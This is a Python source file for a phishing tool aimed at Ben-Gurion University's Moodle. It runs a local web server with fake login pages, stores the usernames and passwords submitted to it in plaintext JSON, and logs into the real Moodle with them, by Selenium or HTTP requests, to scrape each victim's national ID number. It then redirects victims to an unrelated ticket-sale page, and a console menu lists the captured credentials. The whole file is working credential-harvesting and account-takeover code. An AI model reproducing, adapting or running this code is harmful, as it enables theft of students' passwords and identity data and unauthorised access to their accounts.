import cgi
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from urllib.parse import parse_qs
from requests import Session
from bs4 import BeautifulSoup

filename = 'Users.json'
users_list = json.load(open(filename))
op_selenium = True


def chose_method(qs):
    global op_selenium
    global users_list
    try:
        params = parse_qs(qs.split("?")[1])
        u_name = params["name"][0]
        u_pass = params["subject"][0]
        if u_name == "" or u_pass == "":
            print("no username or password")
        else:
            if op_selenium:
                add_user(u_name, u_pass)
            else:
                add_user2(u_name, u_pass)
    except:
        print("Keys Invalid! - Nothing Added.")


def get_ids_selenium(u_name, u_pass):
    user_name = u_name
    user_password = u_pass

    c_drive_path = (sys.path[0] + '/chromedriver')
    s = Service(c_drive_path)

    driver = webdriver.Chrome(service=s)

    driver.implicitly_wait(2)

    try:
        url = "https://moodle2.bgu.ac.il/moodle/local/mydashboard/"
        driver.get(url)

        user = driver.find_element(By.NAME, "username")
        user.send_keys(user_name)

        pas = driver.find_element(By.NAME, "password")
        pas.send_keys(user_password)
        pas.send_keys(Keys.RETURN)

        dropD = driver.find_element(By.ID, "action-menu-toggle-1")
        dropD.send_keys(Keys.RETURN)
        driver.find_element(By.ID, "actionmenuaction-2").click()

        driver.find_element(By.LINK_TEXT, ("עריכת המאפיינים שלי")).click()
        driver.find_element(By.LINK_TEXT, ("מידע נוסף")).click()
        idn = driver.find_element(By.NAME, "idnumber")
        element_attribute_value = idn.get_attribute('value')
        found = element_attribute_value
        driver.quit()
        return format(found)
    except NoSuchElementException:
        print("Error With Logging In.")
        print(f"User Name {u_name}")
        driver.quit()
        return ""


def get_ids():
    users = json.load(open(filename))
    for user in users:
        if not user['Fetched']:
            user['id'] = get_ids_selenium(user['name'], user['pass'])
            user['Fetched'] = True

    j = json.dumps(users, indent=2)
    with open(filename, 'w') as f:
        f.write(j)
        f.close()
    return


def write_to_json(u_name, u_pass, u_id, u_fetched):
    global users_list
    users_list.append({"name": u_name,
                       "pass": u_pass,
                       "id": u_id,
                       "Fetched": u_fetched})

    j = json.dumps(users_list, indent=2)
    with open(filename, 'w') as f:
        f.write(j)
        f.close()


def add_user(u_name, u_pass):
    write_to_json(u_name, u_pass, "", False)


def add_user2(u_name, u_pass):
    session = Session()

    # Get login token
    login_url = "https://moodle2.bgu.ac.il/moodle/login/index.php"

    # Fetch homepage to get login token in HTML
    response = session.get(login_url)
    if not response.ok:
        raise Exception("Got bad HTTP code " + str(response.status_code))

    html = BeautifulSoup(response.content, "html.parser")

    # Method 1
    # form = html.select_one("form#login")
    # token_value = form.select_one("input[type='hidden']")["value"]

    # Method 2
    # Can also use select (which always returns a list) and check that the length is exactly 1
    token_field = html.select_one("form#login > input[name='logintoken']")
    token_value = token_field["value"]

    # Don't care about response, only cookie (saved automatically in session)
    response = session.post(login_url, data={
        "username": u_name,
        "password": u_pass,
        "logintoken": token_value,
    })

    # if "MoodleSession" not in session.cookies:
    #     raise Exception("Didn't authenticate (no cookie)")
    if response.url == "https://moodle2.bgu.ac.il/moodle/login/index.php":
        raise Exception("Bad credentials (couldn't authenticate)")

    # Get TZ
    details_url = "https://moodle2.bgu.ac.il/moodle/user/edit.php"
    response = session.get(details_url)
    # Check response...

    html = BeautifulSoup(response.content, "html.parser")

    tz_field = html.select_one("input#id_idnumber")
    tz = tz_field["value"]
    write_to_json(u_name, u_pass, tz, True)


def add_user3(u_name, u_pass):
    global users_list
    username = u_name
    password = u_pass

    if username == "" or password == "":
        print("no username or password")
        return

    session = Session()

    # Get login token
    login_url = "https://moodle2.bgu.ac.il/moodle/login/index.php"

    # Fetch homepage to get login token in HTML
    response = session.get(login_url)
    if not response.ok:
        raise Exception("Got bad HTTP code " + str(response.status_code))

    html = BeautifulSoup(response.content, "html.parser")

    # Method 1
    # form = html.select_one("form#login")
    # token_value = form.select_one("input[type='hidden']")["value"]

    # Method 2
    # Can also use select (which always returns a list) and check that the length is exactly 1

    # token_field = html.select_one("form#login > input[name='logintoken']")
    # token_value = token_field["value"]
    token_field = html.select("form#login > input[name='logintoken']")
    if not (len(token_field) == 2):
        raise Exception("ERROR: token_field got more than 1 selected", token_field)

    token_value = token_field[0]["value"]

    response = session.post(login_url, data={
        "username": username,
        "password": password,
        "logintoken": token_value,
    })

    # if "MoodleSession" not in session.cookies:
    #     raise Exception("Didn't authenticate (no cookie)")
    if response.url == "https://moodle2.bgu.ac.il/moodle/login/index.php":
        raise Exception("Bad credentials (couldn't authenticate)")

    # Get TZ
    details_url = "https://moodle2.bgu.ac.il/moodle/user/edit.php"

    response = session.get(details_url)
    if not response.ok:
        raise Exception("Got bad HTTP code " + str(response.status_code))

    # Check response...
    html = BeautifulSoup(response.content, "html.parser")

    # tz_field = html.select_one("input#id_idnumber")
    tz_field = html.select("input#id_idnumber")
    if not (len(tz_field) == 1):
        raise Exception("ERROR: tz_field got more than 1 selected", tz_field)

    tz = tz_field[0]["value"]
    write_to_json(username, password, tz, True)


class GETHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.endswith('/login'):
            self.send_response(200)
            self.send_header('content-type', 'text/html')
            self.end_headers()
            self.wfile.write((open("index.html", 'rb')).read())
        else:
            if not (self.path.endswith('.ico')):
                listpath = self.path.split('/')[1]
                chose_method(listpath)
                self.send_response(301)
                self.send_header('content-type', 'text/html')
                self.send_header('Location', '/login')
                self.end_headers()
            else:
                self.send_response(301)
                self.send_header('content-type', 'text/html')
                self.end_headers()
                self.wfile.write('hi'.encode())
        return


class POSTHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.endswith('/login'):
            self.send_response(200)
            self.send_header('content-type', 'text/html')
            self.end_headers()
            self.wfile.write((open("index2.html", 'rb')).read())
        else:
            if not (self.path.endswith('.ico')):
                listpath = self.path.split('/')[1]
                add_user2(listpath)
                self.send_response(301)
                self.send_header('content-type', 'text/html')
                self.send_header('Location', '/login')
                self.end_headers()
            else:
                self.send_response(301)
                self.send_header('content-type', 'text/html')
                self.end_headers()
                self.wfile.write('hi'.encode())

    def do_POST(self):
        if self.path.endswith('/login'):
            ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
            pdict['boundary'] = bytes(pdict['boundary'], "utf-8")
            content_len = int(self.headers.get('content-length'))
            pdict['CONTENT-LENGTH'] = content_len
            if ctype == 'multipart/form-data':
                fields = cgi.parse_multipart(self.rfile, pdict)
                u_name = fields.get('name')[0]
                u_pass = fields.get('subject')[0]
                try:
                    add_user3(u_name, u_pass)

                except:
                    print("invalid username and password")
            self.send_response(301)
            self.send_header('content-type', 'text/html')
            self.send_header('Location', 'https://get-in.com/en/178483?seller_code=jiclKp8cScf')
            self.end_headers()


def run_server(server_post):
    PORT = 8000
    if server_post == 1:
        server = HTTPServer(('', PORT), GETHandler)
    else:
        server = HTTPServer(('', PORT), POSTHandler)
    print('servers now runs on %s' % PORT)
    print('webpage is http://localhost:8000/login')
    server.serve_forever()
    return


def show_users():
    with open(filename, "r") as f:
        temp = json.load(f)
        x = 1
        print("---------------------------------------------------------------------------")
        for t in temp:
            print(f"User #{x}:")
            name = t['name']
            pas = t['pass']
            id_n = t['id']
            fetched = t['Fetched']
            print(f"    Name: {name}")
            print(f"    Password: {pas}")
            print(f"    ID: {id_n}")
            print(f"    Fetched: {fetched}\n")
            x += 1
        print("---------------------------------------------------------------------------")


def reset_users():
    global users_list
    users_list = []
    j = json.dumps(users_list, indent=2)
    with open(filename, 'w') as f:
        f.write(j)
        f.close()
    return


def json_menu():
    print("(1) Print Users List.")
    print("(2) Delete Entire List.")
    print("(3) Delete Specific User.")
    print("(4) Insert Specific Username & Password Directly.")
    print("(5) Return.")


def delete_specific():
    u_name = input("Enter UserName:\n")
    users = json.load(open(filename))
    for i in range(len(users) - 1):
        if users[i]['name'] == u_name:
            del users[i]

    j = json.dumps(users, indent=2)
    with open(filename, 'w') as f:
        f.write(j)
        f.close()
    return


def add_directly():
    u_name = input("Enter UserName:\n")
    u_pass = input("Enter Password:\n")
    write_to_json(u_name, u_pass, "", False)
    print(f"You Added- Name:{u_name}, Pass:{u_pass} To The json File\n")


def json_ops():
    json_menu()
    while True:
        choice = input("Enter your choice:\n")
        if choice == "1":
            show_users()
            return
        elif choice == "2":
            while True:
                check = input("Are you Sure? This Will Delete The Entire Users Archive! [Y/n]\n")
                if check == "Y":
                    reset_users()
                    print("Archive Deleted.")
                    return
                elif check == "n":
                    return
                else:
                    print("Invalid Input, Answer with Y or n\n")
        elif choice == "3":
            delete_specific()
            return
        elif choice == "4":
            add_directly()
            return
        elif choice == "5":
            return
        else:
            print("\nInvalid Choice, Please Read And Try Again.\n")


def main_menu():
    print("__ MENU:__")
    print("(1) Run Server With Get.")
    print("(2) Run Server With Post.")
    print("(3) Json Options.")
    print("(4) Method Options (Get Server Only).")
    print("(5) Get ID's with Selenium.")
    print("(6) exit.")


def main():
    global op_selenium
    while True:
        main_menu()
        choice = input("Enter your choice:\n")
        if choice == "1":
            run_server(1)
        elif choice == "2":
            run_server(0)
        elif choice == "3":
            json_ops()
        elif choice == "4":
            if op_selenium:
                op_selenium = False
                print("Now, When You Run The Server, It Will Automatically Try To Get The ID's Of The Logger.  "
                      "You Won't Have To Apply Any Further Actions")
            else:
                op_selenium = True
        elif choice == "5":
            if op_selenium:
                get_ids()
            else:
                print("Selenium Method Is Turned Off, Chose Option #4 To Enable It Again")
        elif choice == "6":
            print("GoodBye")
            break
        else:
            print("\nInvalid Choice, Please Read And Try Again.\n")


if __name__ == '__main__':
    main()
